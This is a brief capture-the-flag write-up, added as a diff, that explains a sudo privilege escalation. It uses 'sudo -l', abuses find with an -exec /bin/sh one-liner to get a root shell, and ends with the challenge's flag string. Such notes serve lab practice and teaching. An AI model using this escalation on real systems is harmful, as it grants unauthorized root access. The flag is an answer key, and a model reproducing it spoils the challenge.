@@ -1,0 +1,10 @@
+Sudo example 1
+
+use sudo -l and see the find function can be executed with no password 
+
+go to GTFObins and see the privilege escalation using find 
+sudo find . -exec /bin/sh \; -quit
+
+now u have the root permissons 
+cd to root and cat the flag 
+cybered{58695ce1f5d98f81b76a0ce8b4d987a3}
